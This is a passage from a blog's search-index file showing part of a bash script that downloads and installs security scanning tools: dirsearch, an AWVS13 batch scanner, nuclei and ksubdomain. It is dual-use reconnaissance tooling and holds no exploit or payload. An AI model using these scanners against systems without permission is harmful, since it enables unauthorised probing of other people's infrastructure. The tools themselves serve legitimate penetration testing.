class="built_in">cd</span> /opt/</span><br><span class="line">    git <span class="built_in">clone</span> https://github.com/maurosoria/dirsearch.git</span><br><span class="line">    <span class="built_in">cd</span> dirsearch</span><br><span class="line">    pip3 install -r requirements.txt</span><br><span class="line"></span><br><span class="line">    <span class="comment"># awvs13_batch_py3</span></span><br><span class="line">    <span class="built_in">cd</span> /opt</span><br><span class="line">    git <span class="built_in">clone</span> https://github.com/test502git/awvs13_batch_py3.git</span><br><span class="line"></span><br><span class="line">    <span class="comment"># nuclei</span></span><br><span class="line">    <span class="built_in">cd</span> /opt</span><br><span class="line">    wget https://github.com/projectdiscovery/nuclei/releases/download/v2.6.8/nuclei_2.6.8_linux_amd64.zip</span><br><span class="line">    unzip nuclei_2.6.8_linux_amd64.zip</span><br><span class="line">    <span class="built_in">rm</span> -f nuclei_2.6.8_linux_amd64.zip</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># ksubdomain</span></span><br><span class="line">    <span class="built_in">cd</span> /opt</span><br><span class="line">    wget https://github.com/boy-hack/ksubdomain/releases/download/v1.9.5/KSubdomain-v1.9.5-linux.tar</span><br><span class="line">    tar -xf KSubdomain-v1.9.5-linux.tar</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 常用工具 </tag>
            
            <tag> bash脚本 </tag>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
